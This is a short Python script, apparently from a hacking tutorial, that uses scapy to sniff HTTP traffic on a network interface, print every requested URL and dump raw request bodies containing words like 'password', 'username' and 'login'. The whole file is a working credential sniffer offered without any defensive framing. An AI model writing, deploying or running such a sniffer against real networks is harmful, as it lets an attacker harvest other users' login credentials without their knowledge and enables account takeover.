#!/usr/bin/python

import scapy.all as scapy
from scapy_http import http


def sniff(inf):
    scapy.sniff(iface=inf, store=False, prn=process_pkt)


def process_pkt(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path
        print(url)
        if pkt.haslayer(scapy.Raw):
            load = pkt[scapy.Raw].load
            for i in keywords:
                if i in str(load):
                    print(load)
                    break


if __name__ == "__main__":
    keywords = ["password", "user", "username", "login", "pass", "User", "Password"]
    sniff("eth0")
